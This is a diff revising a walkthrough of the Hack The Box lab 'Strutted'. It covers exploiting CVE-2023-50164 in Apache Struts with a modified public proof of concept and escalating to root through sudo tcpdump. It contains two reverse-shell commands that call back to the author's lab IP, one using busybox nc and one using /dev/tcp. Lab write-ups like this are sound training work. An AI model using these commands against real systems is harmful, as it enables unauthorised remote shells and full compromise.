@@ -71,7 +71,9 @@ Inside tomcat-users.xml, we find some credentials:
 ```
 But there’s no /manager/html page, the default admin login path — so this password is kinda useless for now. Might come in handy later.
 
-In the strutted folder, there's a pom.xml file:
+# Foothold
+
+In the strutted folder, there's a pom.xml file, the most intersting part is this:
 
 ```xml
 <properties>
@@ -79,9 +81,13 @@ In the strutted folder, there's a pom.xml file:
 </properties>
 ```
 > pom.xml is a config file in Java projects that defines dependencies and build settings.
-Looking up vulnerabilities for Struts 6.3.0.1, I found this PoC.
+
+Looking up vulnerabilities for Struts 6.3.0.1, I found CVE 2023-50164.
+
 >A critical RCE vuln (CVE-2023-50164, CVSS 9.8) lets attackers manipulate file upload params to gain RCE.
-I also tried this [[https://github.com/jakabakos/CVE-2023-50164-Apache-Struts-RCE|this PoC]], but at first, it didn’t work
+
+I tried this [[https://github.com/jakabakos/CVE-2023-50164-Apache-Struts-RCE|this PoC]], but at first, it didn’t work
+
 ```bash
 └─$ python3 exploit.py --url http://strutted.htb/
 [+] Starting exploitation...
@@ -92,11 +98,12 @@ I also tried this [[https://github.com/jakabakos/CVE-2023-50164-Apache-Struts-RC
 [-] Maximum attempts reached. Exiting...
 ```
 This was actually the hardest and longest part.
-Looking at script, I suspected the web root was deeper than expected, so I adjusted the number of parent directories in the path parameter, plus i added gif magic bytes to the script for the file_content parameter… and finally got it working:
+Looking at script, I suspected that it didn`t work because the web root was deeper than expected, so I adjusted the number of parent directories in the path parameter, plus i added gif magic bytes to the script for the file_content parameter… and finally got it working:
 
 <img width="1665" height="853" alt="2025-08-05 114246" src="https://github.com/user-attachments/assets/42d51827-fdb8-4f22-87a4-989c24a64baa" />
 
 <img width="1187" height="285" alt="2025-08-05 115534" src="https://github.com/user-attachments/assets/b9d8c57b-1ac8-4359-a113-0f5cd36fbf4d" />
+
 Started a local listener on port 9001 and used this command to get a reverse shell:
 ```bash
 CMD > busybox nc 10.10.14.73 9001 -e /bin/bash
@@ -115,7 +122,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 ^Z
 stty raw -echo; fg; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
 ```
-# User Enumeration
+# Shell as james
 Checking /etc/passwd, we see:
 ```bash
 root:x:0:0:root:/root:/bin/bash
@@ -127,10 +134,10 @@ Tried using the credentials we found earlier at the beginning, but didn't work f
 <img width="1470" height="1032" alt="2025-08-05 130322" src="https://github.com/user-attachments/assets/46f6196f-ecca-4a95-9857-7f83b07809d1" />
 (I got stuck for a bit here because I kept trying su - james, but it failed.)
 
-Get the first flag
+Use ssh to autenticate as james, and get the first flag
 <img width="590" height="98" alt="2025-08-05 134050" src="https://github.com/user-attachments/assets/ae4c6cff-e15a-4240-88a0-6bfa32b11f52" />
 
-# Root Flag
+# Privilege Escalation
 Checking sudo privileges
 ```bash
 james@strutted:~$ sudo -l
@@ -141,9 +148,11 @@ User james may run the following commands on localhost:
     (ALL) NOPASSWD: /usr/sbin/tcpdump
 
 ```
-Easy win. According to [[https://gtfobins.github.io/gtfobins/tcpdump/#sudo|GTFOBins]], we can abuse tcpdump to get a root shell.
+Easy win. According to [GTFOBins](https://gtfobins.github.io/gtfobins/tcpdump/#sudo), we can abuse tcpdump binary to get root shell.
 
 <img width="1455" height="392" alt="2025-08-05 140040" src="https://github.com/user-attachments/assets/68e706d9-a95a-400c-9e68-f7a7a1e7f774" />
-Reverse shell caught as root
+
+I will just the "COMMAND" variable to a `/bin/bash -i >& /dev/tcp/10.10.14.73/9002 0>&1` and start a local listener on port 9002.
+
 <img width="1144" height="377" alt="2025-08-05 140708" src="https://github.com/user-attachments/assets/21e4788b-5dc3-4595-86b6-97ab921d29d6" />
-And that’s it — root flag grabbed, box done.
+And that’s it, root flag grabbed, box done.
